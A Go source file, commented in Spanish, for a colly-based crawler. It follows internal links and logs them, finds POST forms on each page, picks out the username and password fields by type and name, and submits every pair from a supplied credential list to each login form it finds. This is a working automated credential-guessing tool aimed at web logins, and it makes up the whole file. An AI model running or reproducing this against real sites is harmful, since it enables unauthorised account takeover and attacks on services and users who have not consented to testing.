package scraper

import (
	"fmt"
	"strings"

	"github.com/gocolly/colly"
)

func NewCollector(credentials []Credential) *colly.Collector {
	c := colly.NewCollector(
		colly.UserAgent("GoBot/1.0"),
	)

	//* Extraer enlaces
	c.OnHTML("a[href]", func(e *colly.HTMLElement) {
		link := e.Attr("href")
		fmt.Printf("Enlace encontrado: %s\n", link)

		// Visitar enlaces internos
		if strings.HasPrefix(link, "/") {
			fullURL := e.Request.AbsoluteURL(link)
			SaveToFile("links.txt", fullURL)
			fmt.Printf("Visitando el enlace: %s\n", fullURL)
			c.Visit(fullURL)
		}

	})

	//* Detectar formularios y simular un envio
	c.OnHTML("form", func(e *colly.HTMLElement) {
		action := e.Attr("action")
		method := e.Attr("method")
		fmt.Printf("Formulario encontrado: Action=%s, Method=%s\n", action, method)

		if strings.ToLower(method) == "post" {
			submitURL := e.Request.AbsoluteURL(action)
			fmt.Printf("Simulando envío al formulario: %s\n", submitURL)

			// Identificar campos de usuario y contraseña

			var usernameField, passwordField string

			e.ForEach("input", func(_ int, input *colly.HTMLElement) {
				inputType := strings.ToLower(input.Attr("type"))
				inputName := strings.ToLower(input.Attr("name"))

				// Identificar campo de usuario
				if inputType == "text" || inputType == "email" || strings.Contains(inputName, "user") || strings.Contains(inputName, "email") || strings.Contains(inputName, "login") {
					usernameField = input.Attr("name")
				}

				// Identificar campo de contraseña
				if inputType == "password" || strings.Contains(inputName, "pass") || strings.Contains(inputName, "contraseña") {
					passwordField = input.Attr("name")
				}
			})

			if usernameField != "" && passwordField != "" {
				fmt.Printf("Campos detectados: Usuario=%s, Contraseña=%s\n", usernameField, passwordField)

				for _, cred := range credentials {
					postData := map[string]string{
						usernameField: cred.Username,
						passwordField: cred.Password,
					}

					fmt.Printf("Probando credenciales: Usuario=%s, Contraseña=%s\n", cred.Username, cred.Password)
					e.Request.Post(submitURL, postData)
				}
			} else {
				fmt.Println("No se encontraron campos de usuario o contraseña")
			}
		}
	})

	return c
}
